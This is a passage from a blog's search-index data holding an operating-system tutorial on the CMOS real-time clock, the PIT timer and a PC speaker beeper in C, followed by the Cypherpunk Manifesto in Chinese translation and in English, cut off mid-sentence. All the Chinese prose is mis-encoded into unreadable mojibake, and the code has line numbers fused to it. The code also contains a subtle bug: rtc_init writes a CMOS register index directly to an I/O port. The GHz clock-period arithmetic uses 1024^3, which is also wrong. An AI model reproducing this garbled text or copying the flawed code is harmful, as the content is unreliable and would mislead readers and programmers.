base=localtimeï¼Œå°±å¯ä»¥å¾—åˆ°å½“å‰æ—¶åŒºæ—¶é—´ï¼Œå°±ä¸éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨è®¡ç®—äº† åŠ¨æ€æ—¶é’Ÿå°±éœ€è¦å¯¹RTCè¿›è¡Œæ›´å¤šæ“ä½œ è€Œä¸”æˆ‘ä»¬å¯¹RTCçš„åŸºæœ¬æ“ä½œå¾ˆå°‘ src/include/xsys/rtc.h 12345678#ifndef XSYS_RTC_H#define XSYS_RTC_Hvoid set_alarm(u32 secs);u8 cmos_read(u8 addr);void cmos_write(u8 addr, u8 value);#endif src/kernel/rtc.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#include &lt;xsys/types.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/interrupt.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/time.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/stdlib.h&gt;#define LOGK(fmt, args...) DEBUGK(fmt, ##args)#define CMOS_ADDR 0x70 // CMOS åœ°å€å¯„å­˜å™¨#define CMOS_DATA 0x71 // CMOS æ•°æ®å¯„å­˜å™¨#define CMOS_SECOND 0x01#define CMOS_MINUTE 0x03#define CMOS_HOUR 0x05#define CMOS_A 0x0a#define CMOS_B 0x0b#define CMOS_C 0x0c#define CMOS_D 0x0d#define CMOS_NMI 0x80// è¯» cmos å¯„å­˜å™¨çš„å€¼u8 cmos_read(u8 addr)&#123; outb(CMOS_ADDR, CMOS_NMI | addr); return inb(CMOS_DATA);&#125;;// å†™ cmos å¯„å­˜å™¨çš„å€¼void cmos_write(u8 addr, u8 value)&#123; outb(CMOS_ADDR, CMOS_NMI | addr); outb(CMOS_DATA, value);&#125;static u32 volatile counter = 0;// å®æ—¶æ—¶é’Ÿä¸­æ–­å¤„ç†å‡½æ•°void rtc_handler(int vector)&#123; // å®æ—¶æ—¶é’Ÿä¸­æ–­å‘é‡å· assert(vector == 0x28); // å‘ä¸­æ–­æ§åˆ¶å™¨å‘é€ä¸­æ–­å¤„ç†å®Œæˆçš„ä¿¡å· send_eoi(vector); // è¯» CMOS å¯„å­˜å™¨ Cï¼Œå…è®¸ CMOS ç»§ç»­äº§ç”Ÿä¸­æ–­ cmos_read(CMOS_C); set_alarm(1); LOGK(&quot;rtc handler %d...\\n&quot;, counter++);&#125;// è®¾ç½® secs ç§’åå‘ç”Ÿå®æ—¶æ—¶é’Ÿä¸­æ–­void set_alarm(u32 secs)&#123; tm time; time_read(&amp;time); u8 sec = secs % 60; secs /= 60; u8 min = secs % 60; secs /= 60; u32 hour = secs; time.tm_sec += sec; if (time.tm_sec &gt;= 60) &#123; time.tm_sec %= 60; time.tm_min += 1; &#125; time.tm_min += min; if (time.tm_min &gt;= 60) &#123; time.tm_min %= 60; time.tm_hour += 1; &#125; time.tm_hour += hour; if (time.tm_hour &gt;= 24) &#123; time.tm_hour %= 24; &#125; cmos_write(CMOS_HOUR, bin_to_bcd(time.tm_hour)); cmos_write(CMOS_MINUTE, bin_to_bcd(time.tm_min)); cmos_write(CMOS_SECOND, bin_to_bcd(time.tm_sec));&#125;void rtc_init()&#123; u8 prev; cmos_write(CMOS_B, 0b01000010); // æ‰“å¼€å‘¨æœŸä¸­æ–­ // cmos_write(CMOS_B, 0b00100010); // æ‰“å¼€é—¹é’Ÿä¸­æ–­ cmos_read(CMOS_C); // è¯» C å¯„å­˜å™¨ï¼Œä»¥å…è®¸ CMOS ä¸­æ–­ // set_alarm(2); // è®¾ç½®ä¸­æ–­é¢‘ç‡ outb(CMOS_A, (inb(CMOS_A) &amp; 0xf) | 0b1110); set_interrupt_handler(IRQ_RTC, rtc_handler); set_interrupt_mask(IRQ_RTC, true); set_interrupt_mask(IRQ_CASCADE, true);&#125; ç€é‡è¯´ä¸€ä¸‹rtc_init 123456789101112131415void rtc_init()&#123; u8 prev; cmos_write(CMOS_B, 0b01000010); // æ‰“å¼€å‘¨æœŸä¸­æ–­ // cmos_write(CMOS_B, 0b00100010); // æ‰“å¼€é—¹é’Ÿä¸­æ–­ cmos_read(CMOS_C); // è¯» C å¯„å­˜å™¨ï¼Œä»¥å…è®¸ CMOS ä¸­æ–­ // set_alarm(2); // è®¾ç½®ä¸­æ–­é¢‘ç‡ outb(CMOS_A, (inb(CMOS_A) &amp; 0xf) | 0b1110); set_interrupt_handler(IRQ_RTC, rtc_handler); set_interrupt_mask(IRQ_RTC, true); set_interrupt_mask(IRQ_CASCADE, true);&#125; cmos_write(CMOS_B, 0b01000010); // æ‰“å¼€å‘¨æœŸä¸­æ–­æ˜¯å•çº¯çš„åŸºæœ¬ä¸­æ–­ï¼Œå³CMOSæŒ‰ç…§å…¶å›ºå®šçš„æ—¶é—´åˆ·æ–° cmos_write(CMOS_B, 0b00100010);æˆ‘ä»¬å°±å¯ä»¥è®¾ç½®æ¯æ¬¡ä¸­æ–­å‘ç”Ÿçš„æ—¶é—´ï¼Œæ¯”å¦‚ä¸Šé¢æ³¨é‡Šæ‰çš„set_alarm(2);å°±æ˜¯ä¸­æ–­æ¯2så‘ç”Ÿä¸€æ¬¡ ä¸¤ä¸ªæ•°å€¼(åŠŸèƒ½)çš„é€‰æ‹©å¯ä»¥ä»8256èŠ¯ç‰‡çš„çº§è”å›¾ä¸­çœ‹å‡º æ—¶é’Ÿä¸­æ–­ å¸¸ç”¨çš„å¯ç¼–ç¨‹å®šæ—¶è®¡æ•°å™¨ (Programmable Interval Timer PIT) æœ‰ Intel 8253/8254ï¼Œå…¶ä¸­ 8254 å¯ä»¥ç§°ä¸º 8253 çš„å¢å¼ºç‰ˆã€‚ åœ¨ 8253 å†…éƒ¨æœ‰ 3 ä¸ªç‹¬ç«‹çš„è®¡æ•°å™¨ï¼Œåˆ†åˆ«æ˜¯è®¡æ•°å™¨ 0 ~ 2ï¼Œç«¯å£å·åˆ†åˆ«ä¸º 0x40 ~ 0x42ï¼›æ¯ä¸ªè®¡æ•°å™¨å®Œå…¨ç›¸åŒï¼Œéƒ½æ˜¯ 16 ä½å¤§å°ï¼Œç›¸äº’ç‹¬ç«‹ï¼Œäº’ä¸å¹²æ¶‰ã€‚ 8253 è®¡æ•°å™¨æ˜¯ä¸ªå‡æ³•è®¡æ•°å™¨ï¼Œä»åˆå€¼å¯„å­˜å™¨ä¸­å¾—åˆ°åˆå€¼ï¼Œç„¶åè½½å…¥è®¡æ•°å™¨ä¸­ï¼Œç„¶åéšç€æ—¶é’Ÿå˜åŒ–é€’å‡ã€‚è®¡æ•°å™¨åˆå€¼å¯„å­˜å™¨ï¼Œè®¡æ•°å™¨æ‰§è¡Œå¯„å­˜å™¨ï¼Œå’Œè¾“å‡ºé”å­˜å™¨éƒ½æ˜¯ 16 ä½çš„å¯„å­˜å™¨ï¼Œé«˜å…«ä½å’Œä½å…«ä½å¯ä»¥å•ç‹¬è®¿é—®ã€‚ è®¡æ•°å™¨ 0 ç”¨äºäº§ç”Ÿæ—¶é’Ÿä¸­æ–­ï¼Œå°±æ˜¯è¿æ¥åœ¨ IRQ0 å¼•è„šä¸Šçš„æ—¶é’Ÿï¼Œä¹Ÿå°±æ˜¯æ§åˆ¶è®¡æ•°å™¨ 0 å¯ä»¥æ§åˆ¶æ—¶é’Ÿå‘ç”Ÿçš„é¢‘ç‡ï¼Œä»¥æ”¹å˜æ—¶é—´ç‰‡çš„é—´éš”ï¼› æ§åˆ¶å­—ç»“æ„ï¼š 7 6 5 4 3 2 1 0 SC1 SC0 RL1 RL0 M2 M1 M0 BCD ä¸‰ä¸ªè®¡æ•°å™¨æœ‰è‡ªå·±å„è‡ªçš„ç”¨é€”ï¼š è®¡æ•°å™¨ 0ï¼Œç«¯å£å· 0x40ï¼Œç”¨äºäº§ç”Ÿæ—¶é’Ÿä¿¡å·ï¼Œå®ƒé‡‡ç”¨å·¥ä½œæ–¹å¼ 3ï¼› è®¡æ•°å™¨ 1ï¼Œç«¯å£å· 0x41ï¼Œç”¨äº DRAM çš„å®šæ—¶åˆ·æ–°æ§åˆ¶ï¼› è®¡æ•°å™¨ 2ï¼Œç«¯å£å· 0x42ï¼Œç”¨äºå†…éƒ¨æ‰¬å£°å™¨å‘å‡ºä¸åŒéŸ³è°ƒçš„å£°éŸ³ï¼ŒåŸç†æ˜¯ç»™æ‰¬å£°å™¨è¾“é€æŸé¢‘ç‡çš„æ–¹æ³¢ï¼› src/kernel/clock.c 1234567891011121314151617181920212223242526272829303132#include &lt;xsys/io.h&gt;#include &lt;xsys/interrupt.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;#define PIT_CHAN0_REG 0X40#define PIT_CHAN2_REG 0X42#define PIT_CTRL_REG 0X43void clock_handler(int vector)&#123; assert(vector == 0x20); send_eoi(vector); jiffies++; DEBUGK(&quot;clock jiffies %d ...\\n&quot;, jiffies);&#125;void pit_init()&#123; // é…ç½®è®¡æ•°å™¨ 0 æ—¶é’Ÿ outb(PIT_CTRL_REG, 0b00110100); outb(PIT_CHAN0_REG, CLOCK_COUNTER &amp; 0xff); outb(PIT_CHAN0_REG, (CLOCK_COUNTER &gt;&gt; 8) &amp; 0xff);&#125;void clock_init()&#123; pit_init(); set_interrupt_handler(IRQ_CLOCK, clock_handler); set_interrupt_mask(IRQ_CLOCK, true);&#125; ä½†æ˜¯è¿™ä¸ªä¾‹å­æ²¡ä»€ä¹ˆå®é™…çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬çœ‹åˆ°çš„ä¹Ÿåªæœ‰ä¸Šé¢ä¸æ–­æ˜¾ç¤ºçš„å­—ç¬¦ï¼Œä¸‹é¢å°±æœ‰äº†æ›´å¥½çš„ä½“éªŒ èœ‚é¸£å™¨ ç”±PITæˆ‘ä»¬å¯ä»¥è®¾ç½®æ–¹æ³¢æ¥å‘å‡ºå£°éŸ³ï¼Œè¦æ·»åŠ ä¸€äº›ä¸œè¥¿ 12345678910111213141516171819202122232425262728293031#define HZ 100#define OSCILLATOR 1193182#define CLOCK_COUNTER (OSCILLATOR / HZ)#define JIFFY (1000 / HZ)#define SPEAKER_REG 0x61#define BEEP_HZ 440#define BEEP_COUNTER (OSCILLATOR / BEEP_HZ)u32 volatile jiffies = 0;u32 jiffy = JIFFY;u32 volatile beeping = 0;void start_beep()&#123; if (!beeping) &#123; outb(SPEAKER_REG, inb(SPEAKER_REG) | 0b11); &#125; beeping = jiffies + 5;&#125;void stop_beep()&#123; if (beeping &amp;&amp; jiffies &gt; beeping) &#123; outb(SPEAKER_REG, inb(SPEAKER_REG) &amp; 0xfc); beeping = 0; &#125;&#125; åŒæ—¶ä¿®æ”¹clock_handler 1234567891011121314void clock_handler(int vector)&#123; assert(vector == 0x20); send_eoi(vector); if(jiffies % 200 == 0) &#123; start_beep(); &#125; jiffies++; DEBUGK(&quot;clock beep %d ...\\n&quot;, jiffies); stop_beep();&#125; åœ¨qemuä¸Šå‘å£°æˆ‘çš„ä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› ä¸è¡Œï¼Œä½†æ˜¯å¯¼å‡ºåœ¨VMwareä¸Šå°±å¯ä»¥äº† è½¯ä¸­æ–­ è¿™ä¸ªé‡Œé¢å°±åŒ…æ‹¬äº†æœ€å¼€å§‹è¯´çš„é™¤0å¼‚å¸¸ã€‚è½¯ä¸­æ–­æ˜¯å‘ç”Ÿåœ¨è®¡ç®—æœºå†…éƒ¨çš„ä¸­æ–­ä¿¡å·ï¼Œæ˜¯ç”±æ‰§è¡ŒæŒ‡ä»¤å¼•èµ·çš„ æ“ä½œç³»ç»Ÿå®ç°-ä¸­æ–­ä¸ç³»ç»Ÿè°ƒç”¨å’Œæ“ä½œç³»ç»Ÿå®ç°-å¼‚å¸¸ä¸»è¦è®²çš„å°±æ˜¯è¿™ç§ä¸­æ–­ CPUæ—¶é’Ÿå‘¨æœŸå’Œå‰é¢å®æ—¶æ—¶é’Ÿçš„ä¸ä¸€æ ·ï¼ŒCPUå†…éƒ¨æ˜¯æœ‰ä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸä½œä¸ºæŒ‡ä»¤æ“ä½œçš„æœ€å°æ­¥éª¤çš„ï¼Œå½“CPUè¿ç®—å¿«æ—¶ï¼Œæ—¶é’Ÿå‘¨æœŸå°±çŸ­ï¼ˆå…¶å€’æ•°é¢‘ç‡å°±è¶Šå¤§ï¼‰ï¼Œå¦‚Intel(R) Core(TM) i5-9300H CPUçš„åŸºç¡€æ—¶é’Ÿé¢‘ç‡å°±æ˜¯2.6GHzï¼Œæ¯ä¸ªæ—¶é’Ÿå‘¨æœŸçš„æ—¶é—´å°±æ˜¯1/(2.6*1024*1024*1024)ç§’ã€‚ å¼•ç”¨ x86æ±‡ç¼–è¯­è¨€ï¼šä»å®æ¨¡å¼åˆ°ä¿æŠ¤æ¨¡å¼ / æå¿ ï¼Œç‹æ™“æ³¢ï¼Œä½™æ´è‘— ä¸­æ–­å¤„ç† - ä¸ŠåŠéƒ¨ï¼ˆç¡¬ä¸­æ–­ï¼‰ æ“ä½œç³»ç»Ÿå®ç°-å†…å­˜ç®¡ç†åˆæ­¥ å¤ä¹  è®¡ç®—æœºå¯åŠ¨è¿‡ç¨‹ 386/486 å†…å­˜åˆ†é¡µä¸­ä»¥ 4KB ä¸ºä¸€é¡µ å¥”è…¾å¤„ç†å™¨ä½¿ç”¨4Mä¸ºä¸€é¡µ","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"os","slug":"notes/os","permalink":"https://joe1sn.eu.org/categories/notes/os/"}],"tags":[{"name":"os","slug":"os","permalink":"https://joe1sn.eu.org/tags/os/"}]},{"title":"å¯†ç æœ‹å…‹ï¼šä¸€ä»½å¯†ç æœ‹å…‹å®£è¨€","slug":"cypherpunk","date":"2022-08-14T07:25:53.000Z","updated":"2023-06-01T14:26:03.768Z","comments":true,"path":"2022/08/14/cypherpunk/","link":"","permalink":"https://joe1sn.eu.org/2022/08/14/cypherpunk/","excerpt":"ä¸ºä½•è‡ªç”±ä¸éšç§å¦‚æ­¤é‡è¦","text":"ä¸ºä½•è‡ªç”±ä¸éšç§å¦‚æ­¤é‡è¦ è¯‘æ–‡ ä¸€ä»½å¯†ç æœ‹å…‹å®£è¨€ Eric Hughesè‘— Joe1snæ¸£è¯‘ éšç§åœ¨ç”µå­æ—¶ä»£å¯¹äºä¸€ä¸ªå¼€æ”¾çš„ç¤¾ä¼šæ˜¯å¿…è¦çš„ã€‚éšç§ä¸æ˜¯ä¿å¯†ã€‚éšç§æ˜¯ä¸€ä¸ªäººä¸æƒ³è®©å…¨ä¸–ç•ŒçŸ¥é“ï¼Œä½†æ˜¯ä¿å¯†æ˜¯ä¸€ä¸ªäººä¸æƒ³è®©å…¨ä»»ä½•äººçŸ¥é“ã€‚éšç§æ˜¯ä¸€ä¸ªäººå¯¹è¿™ä¸ªä¸–ç•Œé€‰æ‹©æ€§è¡¨è¾¾è‡ªæˆ‘çš„æƒåŠ›ã€‚ å¦‚æœåŒæ–¹æœ‰æŸç§äº¤æ˜“ï¼Œé‚£ä¹ˆæ¯ä¸€æ–¹éƒ½æœ‰ä»–ä»¬äº’åŠ¨çš„è®°å¿†ã€‚ æ¯ä¸€æ–¹éƒ½å¯ä»¥è°ˆè®ºä»–ä»¬è‡ªå·±å¯¹æ­¤çš„è®°å¿†ï¼› è°èƒ½é˜»æ­¢è¿™å‘ç”Ÿï¼Ÿäººä»¬å¯ä»¥é€šè¿‡æ³•å¾‹åå¯¹å®ƒï¼Œä½†æ˜¯å¯¹äºè¨€è®ºè‡ªç”±ç”šè‡³æ¯”éšç§æ›´åŠ é‡è¦ï¼Œè¿™æ˜¯å¼€æ”¾ç¤¾ä¼šçš„åŸºç¡€ã€‚å¦‚æœå¤šæ–¹åœ¨åŒä¸€ä¸ªè®ºå›ä¸Šå…±åŒå‘è¨€ï¼Œåˆ™æ¯ä¸€æ–¹éƒ½å¯ä»¥ä¸å…¶ä»–æ‰€æœ‰æ–¹å…±åŒå¯¹è¯ï¼Œå¹¶å°†ä¸ªä½“çš„å’Œå…¶ä»–åªæ˜¯æ±‡æ€»åœ¨ä¸€èµ·ã€‚ç”µå­é€šä¿¡çš„åŠ›é‡å·²ç»ä½¿è¿™ç§è®²è¯ç§°ä¸ºå¯èƒ½ï¼Œå®ƒä¸ä¼šä»…ä»…å› ä¸ºæˆ‘ä»¬å¯èƒ½æƒ³è¦å®ƒè€Œæ¶ˆå¤±ã€‚ æ—¢ç„¶æˆ‘ä»¬æ¸´æœ›éšç§ï¼Œæˆ‘ä»¬å¿…é¡»ç¡®ä¿äº¤æ˜“çš„æ¯æ–¹åªæœ‰ç›´æ¥ä¸è¯¥äº¤æ˜“ç›¸å…³çš„å¿…è¦çš„ä¿¡æ¯ã€‚é‰´äºæ‰€æœ‰ä¿¡æ¯éƒ½èƒ½è¢«è¡¨è¾¾å‡ºï¼Œæˆ‘ä»¬å¿…é¡»ç¡®ä¿å°½å¯èƒ½å°‘åœ°é€éœ²æ— å…³ä¿¡æ¯ã€‚å¯¹äºå¤§å¤šæ•°ä¾‹å­ä¸­çš„ä¸ªäººæ ‡è¯†(ID)çš„éœ€è¦å¹¶ä¸æ˜¯ååˆ†çªå‡ºã€‚å½“æˆ‘ä»¬åœ¨å•†åº—ä¸­è´­ä¹°ä¸€æœ¬æ‚å¿—å¹¶ä»˜æ¬¾ç»™åº—å‘˜æ—¶ï¼Œå¹¶æ²¡æœ‰å¿…è¦çŸ¥é“æˆ‘æ˜¯è°ã€‚å½“æˆ‘è®©æˆ‘çš„ç”µå­é‚®ç®±æä¾›æ–¹æ”¶å‘é‚®ä»¶æ—¶ï¼Œæˆ‘çš„æä¾›æ–¹ä¸éœ€è¦çŸ¥é“è°ä¸æˆ‘å¯¹è¯æˆ–è€…æˆ‘å’Œå…¶ä»–äººè¯´äº†äº›ä»€ä¹ˆã€‚æˆ‘çš„æä¾›æ–¹åªéœ€è¦çŸ¥é“å¦‚ä½•åœ¨é‚£é‡Œè·å–ä¿¡æ¯ä»¥åŠæˆ‘æ¬ ä»–ä»¬å¤šå°‘è´¹ç”¨ã€‚å½“æˆ‘çš„èº«ä»½åœ¨äº¤æ˜“çš„åº•å±‚æœºåˆ¶ä¸­è¢«æ­éœ²äº†ï¼Œæˆ‘å°±å¤±å»äº†éšç§ã€‚æˆ‘ä¸èƒ½åœ¨è¿™é‡Œé€‰æ‹©æ€§åœ°å±•ç¤ºè‡ªå·±ï¼› æˆ‘å¿…é¡» ç»å¸¸ æš´éœ²è‡ªå·±ã€‚ å› æ­¤ï¼Œä¸ºäº†å¼€æ”¾ç¤¾ä¼šä¸­çš„éšç§å°±éœ€è¦ä¸€ç§åŒ¿åäº¤æ˜“ç³»ç»Ÿã€‚ç›´åˆ°ç°åœ¨ï¼Œç°é‡‘æ˜¯ç¬¬ä¸€ä¸ªæ»¡è¶³è¿™ä¸ªæ¡ä»¶çš„ç³»ç»Ÿã€‚ä¸€ä¸ªåŒ¿åçš„äº¤æ˜“ç³»ç»Ÿä¸æ˜¯ä¸€ä¸ªä¿å¯†çš„äº¤æ˜“ç³»ç»Ÿã€‚ä¸€ä¸ªåŒ¿åçš„äº¤æ˜“ç³»ç»Ÿçš„ä¸ªä½“å…·æœ‰æƒ³æ­éœ²è‡ªèº«èº«ä»½å°±æ­éœ²çš„æƒåŠ›ï¼›è¿™ä¹Ÿæ˜¯éšç§çš„æœ¬è´¨ã€‚ åœ¨å¼€æ”¾ç¤¾ä¼šä¸­çš„éšç§ä¹Ÿéœ€è¦å¯†ç å­¦ã€‚å¦‚æœæˆ‘è¯´äº†äº›ä»€ä¹ˆï¼Œæˆ‘åªæƒ³è®©æˆ‘æƒ³çŸ¥é“çš„äººçŸ¥é“ã€‚å¦‚æœæˆ‘çš„ç§å¯†è®²è¯è¢«å…¨ä¸–ç•ŒçŸ¥é“ï¼Œæˆ‘å°±å¤±å»äº†éšç§ã€‚å¯¹ä¿¡æ¯çš„åŠ å¯†è¡¨æ˜äº†å¯¹éšç§çš„è¿½æ±‚ï¼Œä½¿ç”¨å¼±åŠ å¯†ç®—æ³•åŠ å¯†è¡¨è¾¾çš„æ˜¯å¯¹ä¸éšç§ä¸æ˜¯ç‰¹åˆ«çš„è¿½æ±‚ã€‚æ­¤å¤–ï¼Œä¸ºäº†åœ¨é»˜è®¤åŒ¿åçš„æƒ…å†µä¸‹æ˜¾ç¤ºä¸€ä¸ªäººçš„èº«ä»½ï¼Œéœ€è¦å¯†ç å­¦ç­¾åã€‚ æˆ‘ä»¬ä¸èƒ½æŒ‡æœ›æ”¿åºœï¼Œä¼ä¸šï¼Œå…¶ä»–å·¨å¤´ã€ä¸éœ²é¢çš„ç»„ç»‡å‡ºäºä»–ä»¬çš„å–„æ„ä¿è¯æˆ‘ä»¬çš„éšç§ã€‚è°ˆè®ºæˆ‘ä»¬å¯¹ä»–ä»¬æ˜¯æœ‰åˆ©çš„ï¼Œå¹¶ä¸”æˆ‘ä»¬è®¤ä¸ºä»–ä»¬ä¼šè°ˆè®ºæˆ‘ä»¬ã€‚å»å°è¯•ä¿æŠ¤ä»–ä»¬çš„æ¼”è®²å°±æ˜¯åå‡»ä¿¡æ¯çš„çœŸå®ã€‚ä¿¡æ¯ä¸æ˜¯æƒ³è¦è‡ªç”±ï¼Œè€Œæ˜¯æ³¨å®šè‡ªç”±ã€‚ä¿¡æ¯æ‰©å¤§åˆ°æ¯ä¸€ä¸ªå¯ç”¨çš„å­˜å‚¨ç©ºé—´ã€‚ä¿¡æ¯æ˜¯è°£è¨€æ›´å¹´è½»ï¼Œæ›´å¼ºå£®çš„çš„è¡¨äº²ï¼›ä¿¡æ¯æ¯”è°£è¨€æ›´å¿«ï¼Œæœ‰æ›´å¤šçš„çœ¼ç›ï¼ŒçŸ¥é“çš„æ›´å¤šï¼Œäº†è§£çš„æ›´å°‘ã€‚ æˆ‘ä»¬å¿…é¡»ä¿æŠ¤æˆ‘ä»¬çš„éšç§å¦‚æœæˆ‘ä»¬æœŸæœ›çš„è¯ã€‚æˆ‘ä»¬å¿…é¡»åœ¨ä¸€èµ·å…±åŒåˆ›é€ å…è®¸åŒ¿åäº¤æ˜“å‘ç”Ÿçš„ç³»ç»Ÿã€‚äººä»¬åœ¨å‡ ä¸ªä¸–çºªå†…é€šè¿‡è€³è¯­ï¼Œé»‘æš—ï¼Œä¿¡å°ï¼Œç´§é—­çš„é—¨ï¼Œç§˜å¯†æ¡æ‰‹å’Œé‚®é€’ä¿æŠ¤ä»–ä»¬çš„éšç§ã€‚æ—§æ—¶ä»£çš„ç§‘æŠ€å¹¶ä¸å…è®¸æœ‰å¾ˆç§å¯†çš„éšç§ï¼Œä½†æ˜¯ç”µå­ç§‘æŠ€å¯ä»¥ã€‚ æˆ‘ä»¬å¯†ç æœ‹å…‹æŠ•å…¥åˆ°å»ºè®¾åŒ¿åç³»ç»Ÿã€‚æˆ‘ä»¬ä½¿ç”¨å¯†ç å­¦ã€åŒ¿åé‚®ä»¶ã€æ•°å­—ç­¾åå’Œç”µå­è´§å¸æ¥ä¿å«æˆ‘ä»¬çš„éšç§ã€‚ å¯†ç æœ‹å…‹ç¼–å†™ä»£ç ã€‚æˆ‘ä»¬çŸ¥é“æœ‰äººå¿…é¡»ç¼–å†™è½¯ä»¶æ¥ä¿æŠ¤éšç§ï¼Œå¹¶ä¸”é™¤éæˆ‘ä»¬éƒ½è¿™æ ·åšï¼Œå¦åˆ™æˆ‘ä»¬æ— æ³•è·å¾—éšç§ï¼Œå› æ­¤æˆ‘ä»¬å°†ç¼–å†™å®ƒã€‚æˆ‘ä»¬å‘å¸ƒæˆ‘ä»¬çš„ä»£ç æ‰€ä»¥å…¶ä»–çš„å¯†ç æœ‹å…‹å¯ä»¥ç»ƒä¹ å’Œç©è€è¿™äº›ä»£ç ã€‚æˆ‘ä»¬çš„ä»£ç æ˜¯å…¨ä¸–ç•Œæ€§çš„å…è´¹ä½¿ç”¨çš„ã€‚æˆ‘ä»¬å¹¶ä¸å…³å¿ƒå¦‚æœä½ ä¸èµåŒæˆ‘ä»¬ç¼–å†™çš„è½¯ä»¶ã€‚æˆ‘ä»¬çŸ¥é“è½¯ä»¶æ˜¯ä¸å¯èƒ½è¢«æ¯ç­çš„å¹¶ä¸”ä¸€ä¸ªå¤§èŒƒå›´éƒ¨ç½²çš„ç³»ç»Ÿæ˜¯ä¸èƒ½è¢«å…³åœçš„ã€‚ å¯†ç æœ‹å…‹å¯¹å¯†ç å­¦çš„è§„å®šæ„Ÿåˆ°ç—›æƒœï¼Œå› ä¸ºåŠ å¯†æœ¬è´¨ä¸Šæ˜¯ä¸€ç§ç§äººè¡Œä¸ºã€‚äº‹å®ä¸Šï¼Œå¯¹äºåŠ å¯†è¿™ç§è¡Œä¸ºï¼Œè®©ä¿¡æ¯ä»å…¬ä¼—é¢†åŸŸä¸­è¢«ç§»é™¤ã€‚å³ä½¿æ˜¯åå¯¹å¯†ç å­¦çš„æ³•å¾‹ä¹Ÿåªèƒ½è§¦åŠä¸€ä¸ªå›½å®¶çš„è¾¹ç•Œå’Œå®ƒçš„æš´åŠ›æ­¦å™¨ã€‚å¯†ç æœ‹å…‹ä¼šä¸å¯é¿å…åœ°åœ¨å…¨çƒå‘å±•ï¼Œä¼´éšç€çš„æ˜¯åŒ¿åäº¤æ˜“ç³»ç»Ÿä½¿è¿™æˆä¸ºå¯èƒ½ã€‚ ä¸ºäº†éšç§æƒçš„å¹¿æ³›ä¼ æ’­å®ƒå¿…é¡»æˆä¸ºç¤¾ä¼šå…±è¯†çš„ä¸€éƒ¨åˆ†ã€‚äººä»¬å¿…é¡»ä¸ºäº†å…±åŒåˆ©ç›Šæ¥éƒ¨ç½²è¿™äº›ç³»ç»Ÿã€‚éšç§åªèƒ½å»¶ä¼¸åˆ°ç¤¾ä¼šåŒèƒçš„åˆä½œèŒƒå›´å†…ã€‚æˆ‘ä»¬å¯†ç æœ‹å…‹å¯»æ±‚æ‚¨çš„é—®é¢˜å’Œç–‘è™‘ï¼Œå¹¶å¸Œæœ›æˆ‘ä»¬å¯ä»¥ä¸æ‚¨äº’åŠ¨ï¼Œä»¥å…æˆ‘ä»¬è‡ªæ¬ºæ¬ºäººã€‚ç„¶è€Œï¼Œæˆ‘ä»¬ä¸ä¼šå› ä¸ºæœ‰äº›äººå¯èƒ½ä¸åŒæ„æˆ‘ä»¬çš„ç›®æ ‡è€Œç¦»å¼€æˆ‘ä»¬çš„ç›®æ ‡ã€‚ å¯†ç æœ‹å…‹ç§¯æè‡´åŠ›äºä½¿ç½‘ç»œæ›´å®‰å…¨ä»¥ä¿æŠ¤éšç§ã€‚ è®©æˆ‘ä»¬ä¸€èµ·å¿«é€Ÿå‰è¿›ã€‚ å‘å‰ã€‚ Eric Hughes 1993å¹´3æœˆ9æ—¥ åŸæ–‡ A Cypherpunkâ€™s Manifesto by Eric Hughes Privacy is necessary for an open society in the electronic age. Privacy is not secrecy. A private matter is something one doesnâ€™t want the whole world to know, but a secret matter is something one doesnâ€™t want anybody to know. Privacy is the power to selectively reveal oneself to the world. If two parties have some sort of dealings, then each has a memory of their interaction. Each party can speak about their own memory of this; how could anyone prevent it? One could pass laws against it, but the freedom of speech, even more than privacy, is fundamental to an open society; we seek not to restrict any speech at all. If many parties speak together in the same forum, each can speak to all the others and aggregate together knowledge about individuals and other parties. The power of electronic communications has enabled such group speech, and it will not go away merely because we might want it to. Since we desire privacy, we must ensure that each party to a transaction have knowledge only of that which is directly necessary for that transaction. Since any information can be spoken of, we must ensure that we reveal as little as possible. In most cases personal identity is not salient. When I purchase a magazine at a store and hand cash to the clerk, there is no need to know who I am. When I ask my electronic mail provider to send and receive messages, my provider need not know to whom I am speaking or what I am saying or what others are saying to me; my provider only need know how to get the message there and how much I owe them in fees. When my identity is revealed by the underlying mechanism of the transaction, I have no privacy. I cannot here selectively reveal myself; I must always reveal myself. Therefore, privacy in an open society requires anonymous transaction systems. Until now, cash has been the primary such system. An anonymous transaction system is not a secret transaction system. An anonymous system empowers individuals to reveal their identity when desired and only when desired; this is the essence of privacy. Privacy in an open society also requires cryptography. If I say something, I want it heard only by those for whom I intend it. If the content of my speech is available to the world, I have no privacy. To encrypt is to indicate the desire for privacy, and to encrypt with weak cryptography is to indicate not too much desire for privacy. Furthermore, to reveal oneâ€™s identity with assurance when the default is anonymity requires the cryptographic signature. We cannot expect governments, corporations, or other large, faceless organizations to grant us privacy out of their beneficence. It is to their advantage to speak of us, and we should expect that they will speak. To try to prevent their speech is to fight against the realities of information. Information does not just want to be free, it longs to be free. Information expands to fill the available storage space. Information is Rumorâ€™s younger, stronger cousin; Information is fleeter of foot, has more eyes, knows more, and understands less than Rumor. We must defend our own privacy if we expect to have any. We must come together and create systems which allow anonymous transactions to take place. People have been defending their own privacy for centuries with whispers, darkness, envelopes, closed doors, secret handshakes, and couriers. The technologies of the past did not allow for strong privacy, but electronic technologies do. We the Cypherpunks are dedicated to building anonymous systems. We are defending our privacy with cryptography, with anonymous mail forwarding systems, with digital signatures, and with electronic money. Cypherpunks write code. We know that someone has to write software to defend privacy, and since we canâ€™t get privacy unless we all do, weâ€™re going to write it. We publish our code so that our fellow Cypherpunks may practice and play with it. Our code is free for all to use, worldwide. We donâ€™t much care if you donâ€™t approve of the software we write. We know that software canâ€™t be destroyed and that a widely dispersed system canâ€™t be shut down. Cypherpunks deplore regulations on cryptography, for encryption is fundamentally a private act. The act of encryption, in fact, removes information from the public realm. Even laws against cryptography reach only so far as a nationâ€™s border and the arm of its violence. Cryptography will ineluctably spread over the 